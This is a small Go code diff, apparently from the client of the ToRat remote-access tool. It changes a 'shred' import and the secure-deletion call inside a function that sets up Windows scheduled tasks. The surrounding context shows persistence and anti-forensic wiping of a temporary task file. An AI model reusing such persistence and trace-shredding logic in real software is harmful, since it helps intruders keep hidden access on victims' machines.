@@ -12,7 +12,7 @@ import (
 	"syscall"
 	"time"
 
-	"github.com/lu4p/ToRat_client/shred"
+	"github.com/lu4p/shred"
 	"golang.org/x/sys/windows/registry"
 )
 
@@ -122,7 +122,7 @@ func schtasks(path string) error {
 	}
 
 	time.Sleep(5 * time.Second)
-	shred.File(tempxml, true)
+	shred.Conf{1, true, true}.File(tempxml)
 	log.Println("schtask success")
 	return nil
 }
